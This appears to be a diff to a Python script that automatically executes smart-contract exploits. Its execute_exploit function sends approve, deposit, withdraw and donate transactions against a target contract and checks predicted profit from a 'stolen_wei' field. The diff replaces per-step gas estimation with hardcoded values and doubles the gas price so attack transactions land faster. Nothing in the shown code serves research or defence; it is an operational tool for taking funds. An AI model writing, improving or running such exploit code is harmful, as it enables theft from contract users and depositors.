@@ -270,6 +270,25 @@ def _adaptive_min_net_threshold(
     extra_gas_margin = int(est_gas_cost_wei * max(ADAPTIVE_GAS_MULTIPLIER - 1.0, 0.0))
     return ADAPTIVE_BASE_MIN_WEI + slip_loss_wei + extra_gas_margin
 
+def _build_safe_tx(w3: Web3, func_call: Any, base_params: Dict[str, Any]) -> Dict[str, Any]:
+    """
+    Build transaction with safe gas estimation fallback.
+    """
+    # Force gas limit to avoid Web3 estimate_gas bugs
+    params = base_params.copy()
+    params['gas'] = 1500000
+    
+    try:
+        current_price = w3.eth.gas_price
+    except:
+        current_price = base_params.get('maxFeePerGas', MAX_FEE_PER_GAS)
+    
+    new_price = int(current_price * 2)
+    params['maxFeePerGas'] = new_price
+    params['maxPriorityFeePerGas'] = new_price
+    
+    return func_call.build_transaction(params)
+
 def execute_exploit(
     finding: Dict[str, Any],
     dry_run: bool = False
@@ -332,48 +351,8 @@ def execute_exploit(
     
     try:
         # Preflight profit check
-        est_total_gas = 0
-        nonce_cursor = w3.eth.get_transaction_count(my_address)
-        for step in exploit_steps:
-            func = step.get("function")
-            args = step.get("args", [])
-            tx_params_est = {
-                "from": my_address,
-                "nonce": nonce_cursor,
-            }
-            if func == "deal_and_approve" and asset_address:
-                token = w3.eth.contract(address=asset_address, abi=erc20_abi)
-                tx_est = token.functions.approve(contract_address, 2**256 - 1).build_transaction(tx_params_est)
-                try:
-                    est_total_gas += w3.eth.estimate_gas(tx_est)
-                    nonce_cursor += 1
-                except Exception:
-                    pass
-            elif func == "deposit":
-                amount = args[0]
-                tx_est = contract.functions.deposit(amount).build_transaction(tx_params_est)
-                try:
-                    est_total_gas += w3.eth.estimate_gas(tx_est)
-                    nonce_cursor += 1
-                except Exception:
-                    pass
-            elif func == "withdraw":
-                amount = args[0]
-                tx_est = contract.functions.withdraw(amount).build_transaction(tx_params_est)
-                try:
-                    est_total_gas += w3.eth.estimate_gas(tx_est)
-                    nonce_cursor += 1
-                except Exception:
-                    pass
-            elif func == "donate" and asset_address:
-                amount = args[0]
-                token = w3.eth.contract(address=asset_address, abi=erc20_abi)
-                tx_est = token.functions.transfer(contract_address, amount).build_transaction(tx_params_est)
-                try:
-                    est_total_gas += w3.eth.estimate_gas(tx_est)
-                    nonce_cursor += 1
-                except Exception:
-                    pass
+        # Skip estimate_gas to avoid Web3 bugs
+        est_total_gas = 1200000
         predicted_profit = 0
         if "impact" in finding:
             predicted_profit = int(finding["impact"].get("net_profit_wei", finding["impact"].get("stolen_wei", 0)))
